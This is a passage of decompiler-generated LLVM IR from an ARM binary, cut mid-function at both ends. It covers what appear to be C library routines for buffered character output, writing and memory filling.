  store i1 %v3_11b84, i1* %cpsr_c.global-to-local, align 1
  store i32 %arg2, i32* @r4, align 4
  %v0_11b90 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11b90, i32* @r5, align 4
  br i1 %v3_11b84, label %dec_label_pc_11ba8, label %.thread

.thread:                                          ; preds = %dec_label_pc_11b78
  %v2_11b94 = urem i32 %v0_11b90, 256
  store i32 %v2_11b94, i32* %r3.global-to-local, align 4
  %v2_11b98 = trunc i32 %v0_11b90 to i8
  %v4_11b98 = inttoptr i32 %v4_11b7c to i8*
  store i8 %v2_11b98, i8* %v4_11b98, align 1
  %v5_11b98 = load i32, i32* @r2, align 4
  %v6_11b98 = add i32 %v5_11b98, 1
  store i32 %v6_11b98, i32* @r2, align 4
  %v0_11b9c.pr.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_11b9c.pr.pr, label %dec_label_pc_11ba8, label %.thread2

.thread2:                                         ; preds = %.thread
  %v1_11b9c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_11b9c, i32* %r0.global-to-local, align 4
  store i32 %v6_11b98, i32* %v3_11b7c, align 4
  br label %dec_label_pc_11c74

dec_label_pc_11ba8:                               ; preds = %dec_label_pc_11b78, %.thread
  %v3_11ba8 = load i8, i8* %tmp, align 1
  %v4_11ba8 = zext i8 %v3_11ba8 to i32
  %v1_11bac = and i32 %v4_11ba8, 192
  store i32 %v1_11bac, i32* %r3.global-to-local, align 4
  %v2_11bb0 = icmp eq i32 %v1_11bac, 192
  store i1 %v2_11bb0, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_11bb0, label %dec_label_pc_11bcc, label %dec_label_pc_11bb8

dec_label_pc_11bb8:                               ; preds = %dec_label_pc_11ba8
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  %v4_11bc0 = call i32 @function_143c4(i8* nonnull %tmp, i32 128)
  store i32 %v4_11bc0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11bc4 = icmp eq i32 %v4_11bc0, 0
  br i1 %v2_11bc4, label %dec_label_pc_11bcc, label %dec_label_pc_11c70

dec_label_pc_11bcc:                               ; preds = %dec_label_pc_11bb8, %dec_label_pc_11ba8
  %v0_11bcc = load i32, i32* @r4, align 4
  %v1_11bcc = add i32 %v0_11bcc, 4
  %v2_11bcc = inttoptr i32 %v1_11bcc to i32*
  %v3_11bcc = load i32, i32* %v2_11bcc, align 4
  store i32 %v3_11bcc, i32* %r3.global-to-local, align 4
  %v2_11bd0 = icmp ugt i32 %v3_11bcc, -3
  store i1 %v2_11bd0, i1* %cpsr_c.global-to-local, align 1
  %v7_11bd0 = icmp eq i32 %v3_11bcc, -2
  br i1 %v7_11bd0, label %dec_label_pc_11c68, label %dec_label_pc_11bd8

dec_label_pc_11bd8:                               ; preds = %dec_label_pc_11bcc
  %v1_11bd8 = add i32 %v0_11bcc, 12
  %v2_11bd8 = inttoptr i32 %v1_11bd8 to i32*
  %v3_11bd8 = load i32, i32* %v2_11bd8, align 4
  store i32 %v3_11bd8, i32* %r2.global-to-local, align 4
  %v1_11bdc = add i32 %v0_11bcc, 8
  %v2_11bdc = inttoptr i32 %v1_11bdc to i32*
  %v3_11bdc = load i32, i32* %v2_11bdc, align 4
  store i32 %v3_11bdc, i32* %r3.global-to-local, align 4
  %v3_11be0 = icmp uge i32 %v3_11bd8, %v3_11bdc
  store i1 %v3_11be0, i1* %cpsr_c.global-to-local, align 1
  %v9_11be0 = icmp eq i32 %v3_11bd8, %v3_11bdc
  br i1 %v9_11be0, label %dec_label_pc_11c4c, label %dec_label_pc_11be8

dec_label_pc_11be8:                               ; preds = %dec_label_pc_11bd8
  %v1_11be8 = add i32 %v0_11bcc, 16
  %v2_11be8 = inttoptr i32 %v1_11be8 to i32*
  %v3_11be8 = load i32, i32* %v2_11be8, align 4
  store i32 %v3_11be8, i32* %r3.global-to-local, align 4
  %v3_11bec = icmp uge i32 %v3_11bd8, %v3_11be8
  store i1 %v3_11bec, i1* %cpsr_c.global-to-local, align 1
  %v9_11bec = icmp eq i32 %v3_11bd8, %v3_11be8
  br i1 %v9_11bec, label %dec_label_pc_11bf4, label %dec_label_pc_11c04

dec_label_pc_11bf4:                               ; preds = %dec_label_pc_11be8
  store i32 %v0_11bcc, i32* %r0.global-to-local, align 4
  %v2_11bf8 = call i32 @function_10c4c(i32 %v0_11bcc)
  store i32 %v2_11bf8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11bfc = icmp eq i32 %v2_11bf8, 0
  br i1 %v2_11bfc, label %dec_label_pc_11bf4.dec_label_pc_11c04_crit_edge, label %dec_label_pc_11c70

dec_label_pc_11bf4.dec_label_pc_11c04_crit_edge:  ; preds = %dec_label_pc_11bf4
  %v0_11c04.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11c04

dec_label_pc_11c04:                               ; preds = %dec_label_pc_11bf4.dec_label_pc_11c04_crit_edge, %dec_label_pc_11be8
  %v0_11c04 = phi i32 [ %v0_11c04.pre, %dec_label_pc_11bf4.dec_label_pc_11c04_crit_edge ], [ %v0_11bcc, %dec_label_pc_11be8 ]
  %v1_11c04 = add i32 %v0_11c04, 16
  %v2_11c04 = inttoptr i32 %v1_11c04 to i32*
  %v3_11c04 = load i32, i32* %v2_11c04, align 4
  store i32 %v3_11c04, i32* %r2.global-to-local, align 4
  %v0_11c08 = load i32, i32* @r5, align 4
  %v1_11c08 = urem i32 %v0_11c08, 256
  store i32 %v1_11c08, i32* %r1.global-to-local, align 4
  %v1_11c0c = trunc i32 %v0_11c08 to i8
  %v3_11c0c = inttoptr i32 %v3_11c04 to i8*
  store i8 %v1_11c0c, i8* %v3_11c0c, align 1
  %v4_11c0c = load i32, i32* %r2.global-to-local, align 4
  %v5_11c0c = add i32 %v4_11c0c, 1
  store i32 %v5_11c0c, i32* @r2, align 4
  %v0_11c10 = load i32, i32* @r4, align 4
  %v1_11c10 = add i32 %v0_11c10, 1
  %v2_11c10 = inttoptr i32 %v1_11c10 to i8*
  %v3_11c10 = load i8, i8* %v2_11c10, align 1
  %v4_11c10 = zext i8 %v3_11c10 to i32
  store i32 %v4_11c10, i32* %r3.global-to-local, align 4
  %tmp12 = urem i8 %v3_11c10, 2
  %v2_11c14 = icmp eq i8 %tmp12, 0
  %v2_11c18 = add i32 %v0_11c10, 16
  %v3_11c18 = inttoptr i32 %v2_11c18 to i32*
  store i32 %v5_11c0c, i32* %v3_11c18, align 4
  br i1 %v2_11c14, label %dec_label_pc_11c68, label %dec_label_pc_11c20

dec_label_pc_11c20:                               ; preds = %dec_label_pc_11c04
  %v0_11c20 = load i32, i32* %r1.global-to-local, align 4
  %v2_11c20 = icmp ugt i32 %v0_11c20, 9
  store i1 %v2_11c20, i1* %cpsr_c.global-to-local, align 1
  %v7_11c20 = icmp eq i32 %v0_11c20, 10
  br i1 %v7_11c20, label %dec_label_pc_11c28, label %dec_label_pc_11c68

dec_label_pc_11c28:                               ; preds = %dec_label_pc_11c20
  %v0_11c28 = load i32, i32* @r4, align 4
  store i32 %v0_11c28, i32* %r0.global-to-local, align 4
  %v2_11c2c = call i32 @function_10c4c(i32 %v0_11c28)
  store i32 %v2_11c2c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11c30 = icmp eq i32 %v2_11c2c, 0
  br i1 %v2_11c30, label %dec_label_pc_11c68, label %dec_label_pc_11c38

dec_label_pc_11c38:                               ; preds = %dec_label_pc_11c28
  %v0_11c38 = load i32, i32* @r4, align 4
  %v1_11c38 = add i32 %v0_11c38, 16
  %v2_11c38 = inttoptr i32 %v1_11c38 to i32*
  %v3_11c38 = load i32, i32* %v2_11c38, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_11c40 = add i32 %v3_11c38, -1
  store i32 %v1_11c40, i32* %r3.global-to-local, align 4
  store i32 %v1_11c40, i32* %v2_11c38, align 4
  br label %dec_label_pc_11c74

dec_label_pc_11c4c:                               ; preds = %dec_label_pc_11bd8
  %v0_11c50 = load i32, i32* @r5, align 4
  %v6_11c50 = trunc i32 %v0_11c50 to i8
  store i8 %v6_11c50, i8* %stack_var_-13, align 1
  %v9_11c50 = ptrtoint i8* %stack_var_-13 to i32
  store i32 %v9_11c50, i32* %r1.global-to-local, align 4
  %v1_11c54 = inttoptr i32 %v0_11bcc to i8*
  store i32 %v0_11bcc, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_11c5c = call i32 @function_141d0(i8* %v1_11c54, i32 %v9_11c50, i32 1)
  store i32 %v5_11c5c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11c60 = icmp eq i32 %v5_11c5c, 0
  br i1 %v2_11c60, label %dec_label_pc_11c70, label %dec_label_pc_11c68

dec_label_pc_11c68:                               ; preds = %dec_label_pc_11c20, %dec_label_pc_11c4c, %dec_label_pc_11c28, %dec_label_pc_11c04, %dec_label_pc_11bcc
  %v0_11c68 = load i32, i32* @r5, align 4
  %v1_11c68 = urem i32 %v0_11c68, 256
  store i32 %v1_11c68, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11c74

dec_label_pc_11c70:                               ; preds = %dec_label_pc_11bf4, %dec_label_pc_11bb8, %dec_label_pc_11c4c
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11c74

dec_label_pc_11c74:                               ; preds = %.thread2, %dec_label_pc_11c68, %dec_label_pc_11c38, %dec_label_pc_11c70
  %v2_11c78 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_11c78, i32* @r4, align 4
  %v11_11c78 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v11_11c78

; uselistorder directives
  uselistorder i32 %v0_11c20, { 1, 0 }
  uselistorder i32 %v0_11c08, { 1, 0 }
  uselistorder i32 %v0_11bcc, { 0, 1, 2, 4, 3, 5, 7, 6, 8 }
  uselistorder i32 %v0_11b90, { 1, 0, 2 }
  uselistorder i8* %tmp, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 2, 3, 14, 4, 5, 7, 6, 9, 8, 13, 10, 12, 0, 1 }
  uselistorder i32 %arg2, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_11c74, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_11c70, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11c68, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_11ba8, { 1, 0 }
}

define i32 @function_11c7c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11c7c:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11c7c = load i32, i32* @r4, align 4
  store i32 %v3_11c7c, i32* %stack_var_-16, align 4
  %v6_11c7c = load i32, i32* @r5, align 4
  %v9_11c7c = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_11c88 = call i32 @function_11e30()
  store i32 %v0_11c88, i32* @r6, align 4
  %v0_11c90 = load i32, i32* @r5, align 4
  %v0_11c94 = load i32, i32* @r4, align 4
  %v4_11ca0 = inttoptr i32 %v0_11c90 to i8*
  %v5_11ca0 = call i32 @function_11cb0(i32 %v0_11c94, i32 1, i32 %v0_11c88, i8* %v4_11ca0)
  %v1_11ca4 = load i32, i32* @r6, align 4
  %v9_11ca4 = icmp eq i32 %v5_11ca0, %v1_11ca4
  br i1 %v9_11ca4, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_11c7c
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_11c7c, %bb
  %v14_11cac = phi i32 [ %v5_11ca0, %dec_label_pc_11c7c ], [ -1, %bb ]
  %v2_11cac = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_11cac, i32* @r4, align 4
  store i32 %v6_11c7c, i32* @r5, align 4
  store i32 %v9_11c7c, i32* @r6, align 4
  ret i32 %v14_11cac

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_11cb0(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
dec_label_pc_11cb0:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v9_11cb0 = load i32, i32* @r6, align 4
  %v12_11cb0 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_11cb8 = load i8, i8* %arg4, align 1
  %v4_11cb8 = zext i8 %v3_11cb8 to i32
  %v1_11cbc = and i32 %v4_11cb8, 192
  store i32 %v1_11cbc, i32* %r3.global-to-local, align 4
  %v2_11cc0 = icmp eq i32 %v1_11cbc, 192
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_11cc0, label %dec_label_pc_11ce8, label %dec_label_pc_11cdc

dec_label_pc_11cdc:                               ; preds = %dec_label_pc_11cb0
  %v4_11cdc = call i32 @function_143c4(i8* nonnull %arg4, i32 128)
  %v2_11ce0 = icmp eq i32 %v4_11cdc, 0
  br i1 %v2_11ce0, label %dec_label_pc_11cdc.dec_label_pc_11ce8_crit_edge, label %dec_label_pc_11d50

dec_label_pc_11cdc.dec_label_pc_11ce8_crit_edge:  ; preds = %dec_label_pc_11cdc
  %v0_11ce8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11ce8

dec_label_pc_11ce8:                               ; preds = %dec_label_pc_11cdc.dec_label_pc_11ce8_crit_edge, %dec_label_pc_11cb0
  %v0_11cf01 = phi i32 [ %v0_11ce8.pre, %dec_label_pc_11cdc.dec_label_pc_11ce8_crit_edge ], [ %arg2, %dec_label_pc_11cb0 ]
  %v2_11ce8 = icmp eq i32 %v0_11cf01, 0
  br i1 %v2_11ce8, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_11ce8
  br label %dec_label_pc_11d50

bb:                                               ; preds = %dec_label_pc_11ce8
  %v1_11cec = load i32, i32* @r6, align 4
  %v3_11cec = icmp eq i32 %v1_11cec, 0
  store i32 %v0_11cf01, i32* @r1, align 4
  store i32 -1, i32* @r0, align 4
  br i1 %v3_11cec, label %dec_label_pc_11d50, label %dec_label_pc_11cfc

dec_label_pc_11cfc:                               ; preds = %bb
  %v0_11cfc = call i32 @function_10218()
  %v0_11d00 = load i32, i32* @r6, align 4
  %v0_11d04 = load i32, i32* @r4, align 4
  %tmp10 = icmp ugt i32 %v0_11d00, %v0_11cfc
  br i1 %tmp10, label %dec_label_pc_11d28, label %dec_label_pc_11d10

dec_label_pc_11d10:                               ; preds = %dec_label_pc_11cfc
  %v0_11d08 = load i32, i32* @r7, align 4
  %v1_11d10 = load i32, i32* @r5, align 4
  %v2_11d10 = mul i32 %v1_11d10, %v0_11d00
  %v4_11d14 = call i32 @function_1428c(i32 %v0_11d08, i32 %v2_11d10, i32 %v0_11d04)
  store i32 %v4_11d14, i32* @r0, align 4
  %v0_11d18 = load i32, i32* @r5, align 4
  store i32 %v0_11d18, i32* @r1, align 4
  %v0_11d1c = call i32 @function_10218()
  store i32 %v0_11d1c, i32* @r2, align 4
  br label %dec_label_pc_11d54

dec_label_pc_11d28:                               ; preds = %dec_label_pc_11cfc
  %v1_11d28 = inttoptr i32 %v0_11d04 to i32*
  %v2_11d28 = load i32, i32* %v1_11d28, align 4
  %v1_11d2c = or i32 %v2_11d28, 8
  store i32 %v1_11d2c, i32* %r3.global-to-local, align 4
  %v3_11d30 = sdiv i32 %v2_11d28, 256
  %v1_11d34 = trunc i32 %v3_11d30 to i8
  %v3_11d34 = add i32 %v0_11d04, 1
  %v4_11d34 = inttoptr i32 %v3_11d34 to i8*
  store i8 %v1_11d34, i8* %v4_11d34, align 1
  %v0_11d38 = load i32, i32* %r3.global-to-local, align 4
  %v1_11d38 = trunc i32 %v0_11d38 to i8
  %v2_11d38 = load i32, i32* @r4, align 4
  %v3_11d38 = inttoptr i32 %v2_11d38 to i8*
  store i8 %v1_11d38, i8* %v3_11d38, align 1
  %v0_11d3c = call i32 @function_10a18()
  store i32 22, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_11d48 = inttoptr i32 %v0_11d3c to i32*
  store i32 22, i32* %v2_11d48, align 4
  %v0_11d54.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_11d54

dec_label_pc_11d50:                               ; preds = %.thread, %dec_label_pc_11cdc, %bb
  store i32 0, i32* @r2, align 4
  br label %dec_label_pc_11d54

dec_label_pc_11d54:                               ; preds = %dec_label_pc_11d28, %dec_label_pc_11d10, %dec_label_pc_11d50
  %v0_11d54 = phi i32 [ %v0_11d54.pre, %dec_label_pc_11d28 ], [ %v0_11d1c, %dec_label_pc_11d10 ], [ 0, %dec_label_pc_11d50 ]
  store i32 %v9_11cb0, i32* @r6, align 4
  store i32 %v12_11cb0, i32* @r7, align 4
  ret i32 %v0_11d54

; uselistorder directives
  uselistorder i32 %v0_11d00, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 (i32, i32, i32)* @function_1428c, { 3, 2, 0, 1 }
  uselistorder i32 192, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_11d54, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11d50, { 2, 0, 1 }
}

define i32 @function_11d60() local_unnamed_addr {
dec_label_pc_11d60:
  %v0_11d60 = call i32 @function_14eb0()
  ret i32 %v0_11d60
}

define i32 @function_11d70(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11d70:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_11d74 = load i32, i32* @r2, align 4
  %v8_11d74 = icmp eq i32 %v0_11d74, 8
  store i1 %v8_11d74, i1* %cpsr_z.global-to-local, align 1
  %v5_11d78 = icmp slt i32 %v0_11d74, 8
  br i1 %v5_11d78, label %dec_label_pc_11dd8, label %dec_label_pc_11d7c

dec_label_pc_11d7c:                               ; preds = %dec_label_pc_11d70
  %v4_11d7c = mul i32 %arg2, 256
  %v5_11d7c = or i32 %v4_11d7c, %arg2
  %v4_11d80 = mul i32 %v5_11d7c, 65536
  %v5_11d80 = or i32 %v4_11d80, %v5_11d7c
  store i32 %v5_11d80, i32* %r1.global-to-local, align 4
  %v1_11d8457 = urem i32 %tmp, 4
  %v2_11d8458 = icmp eq i32 %v1_11d8457, 0
  store i1 %v2_11d8458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_11d8458, label %dec_label_pc_11d94, label %bb

bb:                                               ; preds = %dec_label_pc_11d7c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_11d7c ]
  %v3_11d8859 = phi i32 [ %v6_11d88, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_11d7c ]
  %v4_11d88 = inttoptr i32 %v3_11d8859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_11d88, align 1
  %v5_11d88 = load i32, i32* %r3.global-to-local, align 4
  %v6_11d88 = add i32 %v5_11d88, 1
  store i32 %v6_11d88, i32* %r3.global-to-local, align 4
  %v0_11d8c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_11d98.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_11d8c.pr, label %dec_label_pc_11d94, label %.thread

.thread:                                          ; preds = %bb
  %v2_11d8c = add i32 %v0_11d98.pr.pre, -1
  store i32 %v2_11d8c, i32* @r2, align 4
  %v1_11d84 = urem i32 %v6_11d88, 4
  %v2_11d84 = icmp eq i32 %v1_11d84, 0
  store i1 %v2_11d84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11d84, label %dec_label_pc_11d94, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_11d88.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_11d88.pre to i8
  br label %bb

dec_label_pc_11d94:                               ; preds = %.thread, %bb, %dec_label_pc_11d7c
  %v0_11da028 = phi i32 [ %tmp, %dec_label_pc_11d7c ], [ %v6_11d88, %bb ], [ %v6_11d88, %.thread ]
  %v0_11d98.pr = phi i32 [ %v0_11d74, %dec_label_pc_11d7c ], [ %v0_11d98.pr.pre, %bb ], [ %v2_11d8c, %.thread ]
  %v0_11d94 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_11d94, i32* @ip, align 4
  %v8_11d9810 = icmp eq i32 %v0_11d98.pr, 8
  store i1 %v8_11d9810, i1* %cpsr_z.global-to-local, align 1
  %v5_11d9c11 = icmp slt i32 %v0_11d98.pr, 8
  br i1 %v5_11d9c11, label %dec_label_pc_11dd8, label %dec_label_pc_11da0.preheader

dec_label_pc_11da0.preheader:                     ; preds = %dec_label_pc_11d94
  %v1_11da046 = inttoptr i32 %v0_11da028 to i32*
  store i32 %v0_11d94, i32* %v1_11da046, align 4
  %v3_11da047 = add i32 %v0_11da028, 4
  %v4_11da048 = inttoptr i32 %v3_11da047 to i32*
  %v5_11da049 = load i32, i32* @ip, align 4
  store i32 %v5_11da049, i32* %v4_11da048, align 4
  %v6_11da050 = add i32 %v0_11da028, 8
  store i32 %v6_11da050, i32* %r3.global-to-local, align 4
  %v0_11da451 = load i32, i32* @r2, align 4
  %v1_11da452 = add i32 %v0_11da451, -8
  store i32 %v1_11da452, i32* %r2.global-to-local, align 4
  %v5_11dac53 = icmp slt i32 %v1_11da452, 8
  br i1 %v5_11dac53, label %dec_label_pc_11da0.dec_label_pc_11dd8.loopexit_crit_edge, label %dec_label_pc_11db0

dec_label_pc_11db0:                               ; preds = %dec_label_pc_11da0.preheader, %dec_label_pc_11d98.dec_label_pc_11da0_crit_edge
  %v6_11da055 = phi i32 [ %v6_11da0, %dec_label_pc_11d98.dec_label_pc_11da0_crit_edge ], [ %v6_11da050, %dec_label_pc_11da0.preheader ]
  %v0_11da054 = phi i32 [ %v12_11dcc, %dec_label_pc_11d98.dec_label_pc_11da0_crit_edge ], [ %v0_11da028, %dec_label_pc_11da0.preheader ]
  %v1_11db0 = inttoptr i32 %v6_11da055 to i32*
  %v2_11db0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_11db0, i32* %v1_11db0, align 4
  %v3_11db0 = add i32 %v0_11da054, 12
  %v4_11db0 = inttoptr i32 %v3_11db0 to i32*
  %v5_11db0 = load i32, i32* @ip, align 4
  store i32 %v5_11db0, i32* %v4_11db0, align 4
  %v6_11db0 = add i32 %v0_11da054, 16
  store i32 %v6_11db0, i32* %r3.global-to-local, align 4
  %v0_11db4 = load i32, i32* %r2.global-to-local, align 4
  %v1_11db4 = add i32 %v0_11db4, -8
  store i32 %v1_11db4, i32* %r2.global-to-local, align 4
  %v5_11dbc = icmp slt i32 %v1_11db4, 8
  br i1 %v5_11dbc, label %dec_label_pc_11db0.dec_label_pc_11dd8.loopexit_crit_edge, label %dec_label_pc_11dc0

dec_label_pc_11dc0:                               ; preds = %dec_label_pc_11db0
  %v1_11dc0 = inttoptr i32 %v6_11db0 to i32*
  %v2_11dc0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_11dc0, i32* %v1_11dc0, align 4
  %v3_11dc0 = add i32 %v0_11da054, 20
  %v4_11dc0 = inttoptr i32 %v3_11dc0 to i32*
  %v5_11dc0 = load i32, i32* @ip, align 4
  store i32 %v5_11dc0, i32* %v4_11dc0, align 4
  %v6_11dc0 = add i32 %v0_11da054, 24
  store i32 %v6_11dc0, i32* %r3.global-to-local, align 4
  %v0_11dc4 = load i32, i32* %r2.global-to-local, align 4
  %v1_11dc4 = add i32 %v0_11dc4, -8
  store i32 %v1_11dc4, i32* %r2.global-to-local, align 4
  %v5_11dcc = icmp slt i32 %v1_11dc4, 8
  br i1 %v5_11dcc, label %dec_label_pc_11dc0.dec_label_pc_11dd8.loopexit_crit_edge, label %dec_label_pc_11d98

dec_label_pc_11d98:                               ; preds = %dec_label_pc_11dc0
  %v7_11dcc = inttoptr i32 %v6_11dc0 to i32*
  %v8_11dcc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_11dcc, i32* %v7_11dcc, align 4
  %v9_11dcc = add i32 %v0_11da054, 28
  %v10_11dcc = inttoptr i32 %v9_11dcc to i32*
  %v11_11dcc = load i32, i32* @ip, align 4
  store i32 %v11_11dcc, i32* %v10_11dcc, align 4
  %v12_11dcc = add i32 %v0_11da054, 32
  store i32 %v12_11dcc, i32* %r3.global-to-local, align 4
  %v6_11dd0 = load i32, i32* %r2.global-to-local, align 4
  %v7_11dd0 = add i32 %v6_11dd0, -8
  store i32 %v7_11dd0, i32* %r2.global-to-local, align 4
  %v5_11d9c = icmp slt i32 %v7_11dd0, 8
  br i1 %v5_11d9c, label %dec_label_pc_11d98.dec_label_pc_11dd8.loopexit_crit_edge, label %dec_label_pc_11d98.dec_label_pc_11da0_crit_edge

dec_label_pc_11d98.dec_label_pc_11da0_crit_edge:  ; preds = %dec_label_pc_11d98
  %v2_11da0.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_11da0 = inttoptr i32 %v12_11dcc to i32*
  store i32 %v2_11da0.pre, i32* %v1_11da0, align 4
  %v3_11da0 = add i32 %v0_11da054, 36
  %v4_11da0 = inttoptr i32 %v3_11da0 to i32*
  %v5_11da0 = load i32, i32* @ip, align 4
  store i32 %v5_11da0, i32* %v4_11da0, align 4
  %v6_11da0 = add i32 %v0_11da054, 40
  store i32 %v6_11da0, i32* %r3.global-to-local, align 4
  %v0_11da4 = load i32, i32* %r2.global-to-local, align 4
  %v1_11da4 = add i32 %v0_11da4, -8
  store i32 %v1_11da4, i32* %r2.global-to-local, align 4
  %v5_11dac = icmp slt i32 %v1_11da4, 8
  br i1 %v5_11dac, label %dec_label_pc_11da0.dec_label_pc_11dd8.loopexit_crit_edge, label %dec_label_pc_11db0

dec_label_pc_11da0.dec_label_pc_11dd8.loopexit_crit_edge: ; preds = %dec_label_pc_11d98.dec_label_pc_11da0_crit_edge, %dec_label_pc_11da0.preheader
  %v1_11da4.lcssa = phi i32 [ %v1_11da452, %dec_label_pc_11da0.preheader ], [ %v1_11da4, %dec_label_pc_11d98.dec_label_pc_11da0_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11dd8

dec_label_pc_11d98.dec_label_pc_11dd8.loopexit_crit_edge: ; preds = %dec_label_pc_11d98
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11dd8

dec_label_pc_11db0.dec_label_pc_11dd8.loopexit_crit_edge: ; preds = %dec_label_pc_11db0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11dd8

dec_label_pc_11dc0.dec_label_pc_11dd8.loopexit_crit_edge: ; preds = %dec_label_pc_11dc0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11dd8

dec_label_pc_11dd8:                               ; preds = %dec_label_pc_11d94, %dec_label_pc_11da0.dec_label_pc_11dd8.loopexit_crit_edge, %dec_label_pc_11d98.dec_label_pc_11dd8.loopexit_crit_edge, %dec_label_pc_11db0.dec_label_pc_11dd8.loopexit_crit_edge, %dec_label_pc_11dc0.dec_label_pc_11dd8.loopexit_crit_edge, %dec_label_pc_11d70
  %v0_11de0 = phi i32 [ %v0_11d74, %dec_label_pc_11d70 ], [ %v1_11dc4, %dec_label_pc_11dc0.dec_label_pc_11dd8.loopexit_crit_edge ], [ %v1_11db4, %dec_label_pc_11db0.dec_label_pc_11dd8.loopexit_crit_edge ], [ %v7_11dd0, %dec_label_pc_11d98.dec_label_pc_11dd8.loopexit_crit_edge ], [ %v1_11da4.lcssa, %dec_label_pc_11da0.dec_label_pc_11dd8.loopexit_crit_edge ], [ %v0_11d98.pr, %dec_label_pc_11d94 ]
  %v2_11dd8 = icmp eq i32 %v0_11de0, 0
  store i1 %v2_11dd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11dd8, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_11dd8
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_11dd8
  %v1_11de0 = sub i32 7, %v0_11de0
  store i32 %v1_11de0, i32* %r2.global-to-local, align 4
  %v3_11de4 = mul i32 %v1_11de0, 4
  %v4_11de4 = add i32 %v3_11de4, ptrtoint (i32* @global_var_11dec.281 to i32)
  call void @__pseudo_branch(i32 %v4_11de4)
  %v0_11dec = load i32, i32* %r1.global-to-local, align 4
  %v1_11dec = trunc i32 %v0_11dec to i8
  %v2_11dec = load i32, i32* %r3.global-to-local, align 4
  %v3_11dec = inttoptr i32 %v2_11dec to i8*
  store i8 %v1_11dec, i8* %v3_11dec, align 1
  %v4_11dec = load i32, i32* %r3.global-to-local, align 4
  %v5_11dec = add i32 %v4_11dec, 1
  store i32 %v5_11dec, i32* %r3.global-to-local, align 4
  %v0_11df0 = load i32, i32* %r1.global-to-local, align 4
  %v1_11df0 = trunc i32 %v0_11df0 to i8
  %v3_11df0 = inttoptr i32 %v5_11dec to i8*
